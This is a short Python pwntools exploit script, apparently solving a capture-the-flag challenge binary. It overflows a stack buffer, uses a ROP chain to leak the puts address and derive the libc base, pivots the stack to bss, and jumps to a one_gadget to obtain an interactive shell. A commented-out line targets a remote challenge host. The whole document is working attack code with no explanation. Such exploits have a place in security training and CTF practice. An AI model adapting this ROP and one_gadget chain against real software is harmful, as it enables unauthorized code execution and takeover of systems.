from pwn import *
context.log_level="debug"
io = process("./a.out")
#io=remote("chuj.top",39853)
elf = ELF("./a.out")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

bss_pos = 0x404060
offset = 3000
main_addr = 0x4011D6
leave_ret = 0x40125A
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
read_plt = elf.plt["read"]
pop_rdi_ret = 0x401363
pop_rsi_r15_ret = 0x401361
ret = 0x40101a
payload = b"a"*48 + p64(bss_pos) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
payload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(bss_pos) + p64(0) + p64(read_plt) + p64(leave_ret)
payload = payload.ljust(offset,b"a")
io.sendline(payload)
puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
print("puts_addr==" + hex(puts_addr))
libc_base = puts_addr - libc.symbols["puts"]
print("libc_base==" + hex(libc_base))

pop_rdx_r12_ret = libc_base + 0x11c371
ogg = libc_base+ 0xe6c7e

payload = b"a"*8 + p64(pop_rdx_r12_ret) + p64(0) + p64(0) + p64(ogg) + b"a"*3000
io.sendline(payload)


io.interactive()
